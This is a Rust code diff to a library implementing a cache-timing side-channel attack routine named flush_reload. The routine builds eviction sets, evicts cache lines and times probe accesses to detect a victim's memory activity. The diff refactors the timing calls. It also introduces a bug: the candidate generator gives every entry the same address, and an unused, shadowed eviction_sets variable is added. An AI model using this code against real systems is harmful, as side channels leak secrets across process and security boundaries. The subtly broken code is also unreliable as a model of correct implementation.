@@ -2,6 +2,8 @@ use core::{hint::black_box, mem::ManuallyDrop};
 
 use alloc::{boxed::Box, collections::LinkedList, vec::Vec};
 
+use self::env::timed_access;
+
 const CACHE_LINE_SIZE : usize = 64;
 const CACHE_ASSOCIATIVITY : usize = 12;
 
@@ -44,14 +46,15 @@ mod env {
 }
 
 #[inline(always)]
-fn probe(target: &[u8], offset: u32) -> u64 {
-    let start = env::get_time();
-    env::access(offset);
-    env::get_time() - start
+fn probe(offset: u32) -> u64 {
+    // let start = env::get_time();
+    // env::access(offset);
+    // env::get_time() - start
+    env::timed_access(offset)
 }
 
 #[inline(always)]
-fn evict(target: &[u8], eviction_set: &LinkedList<u32>) {
+fn evict(eviction_set: &LinkedList<u32>) {
     eviction_set
         .iter()
         .for_each(|offset| env::access(*offset));
@@ -65,9 +68,9 @@ fn wait(number_of_cycles: u32) {
     }
 }
 
-fn get_slow_time(eviction_set: &LinkedList<u32>, target: &[u8], offset: u32) -> u64 {
-    evict(target, eviction_set);
-    probe(target, offset)
+fn get_slow_time(eviction_set: &LinkedList<u32>, offset: u32) -> u64 {
+    evict(eviction_set);
+    probe(offset)
 }
 
 fn generate_conflict_set(eviction_sets: &Vec<LinkedList<u32>>) -> LinkedList<u32> {
@@ -87,7 +90,7 @@ fn generate_eviction_set(target: &[u8], probe: u32, candidate_set: &LinkedList<u
         }
         let mut new_eviction_set : LinkedList<u32> = eviction_set.clone();
         new_eviction_set.append(& mut candidate_set);
-        if threshold < get_slow_time(&new_eviction_set, target, probe) {
+        if threshold < get_slow_time(&new_eviction_set, probe) {
             eviction_set.push_back(random_offset);
         }
     }
@@ -97,7 +100,7 @@ fn generate_eviction_set(target: &[u8], probe: u32, candidate_set: &LinkedList<u
 fn generate_candidate_set(target: &[u8]) -> LinkedList<u32> {
     let number_of_candidates = target.len() / CACHE_LINE_SIZE;
     let mut candidates : Vec<usize> = (0..number_of_candidates)
-        .map(|i| i * CACHE_LINE_SIZE)
+        .map(|i| (target.as_ptr() as usize) + (CACHE_LINE_SIZE))
         .collect();
     (0..number_of_candidates)
         .map(|_| {
@@ -130,7 +133,8 @@ pub extern "C" fn flush_reload(threshold: u32, time_slots: u32, wait_cycles: u32
     let target = unsafe { core::slice::from_raw_parts(target, target_size) };
     let probes = unsafe { core::slice::from_raw_parts(probes, probe_size) };
 
-    let candidate_set : LinkedList<u32> = generate_candidate_set(target.as_ref());
+    let candidate_set : LinkedList<u32> = generate_candidate_set(target);
+    let mut eviction_sets : Vec<LinkedList<u32>> = Vec::with_capacity(probes.len());
     let eviction_sets : Vec<LinkedList<u32>> = probes //config.probes
         .iter()
         .map(|offset| generate_eviction_set(target.as_ref(), *offset, &candidate_set, threshold as u64))
@@ -142,10 +146,9 @@ pub extern "C" fn flush_reload(threshold: u32, time_slots: u32, wait_cycles: u32
             let start = env::get_time();
             let time_slot_results : Vec<u32> = probes
                 .iter()
-                .map(|p| probe(target, *p) as u32)
+                .map(|p| probe(*p) as u32)
                 .collect();
-
-            evict(target.as_ref(), &conflict_set);
+            evict(&conflict_set);
             while env::get_time() - start < time_slot_size as u64 {
                 wait(wait_cycles);
             }
